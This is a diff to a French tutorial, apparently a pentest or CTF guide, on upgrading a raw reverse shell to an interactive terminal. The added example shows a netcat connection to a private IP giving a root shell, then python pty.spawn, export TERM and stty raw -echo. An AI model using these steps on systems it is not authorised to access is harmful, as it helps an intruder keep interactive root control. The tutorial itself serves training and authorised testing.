@@ -146,6 +146,14 @@ Comme python est installé dans la plupart des machines on peut l'utiliser pour 
 Une fois dans notre shell la première commande à executer est **`python -c 'import pty;pty.spawn("/bin/bash")'`**.
 Cela rendra notre shell **plus beau** mais les touches comme les flèches et les tabulations ne nous serront toujours pas accessible, tout comme le problème du CTRL + C.
 
+```shell
+claquetteuuuh@ip:~$ nc 192.168.1.104 4433
+whoami
+root
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@raspberrypi:/home/thomas#
+```
+
 #### 2- Commande de terme
 
 Pour acceder aux **commandes de termes** comme `clear`, on doit executer la commande **`export TERM=xterm`**.
@@ -153,5 +161,5 @@ Pour acceder aux **commandes de termes** comme `clear`, on doit executer la comm
 #### 3- Acces aux touches
 
 Pour retirer les problèmes principaux, on va d'abord mettre notre **shell en arrière plan** en utilisant ***CTRL + Z***.
-**Une fois dans notre terminal** on va executer la commande **`stty raw -echo; fg`** qui va **désactiver notre propre echo** et donc donner accès aux touches et à l'auto-completion puis remettre en premier plan notre shell.
+**Une fois dans notre terminal** on va executer la commande **`stty raw -echo; fg`** qui va **désactiver notre propre echo** et donc **donner accès aux touches et à l'auto-completion** puis remettre en premier plan notre shell.
 
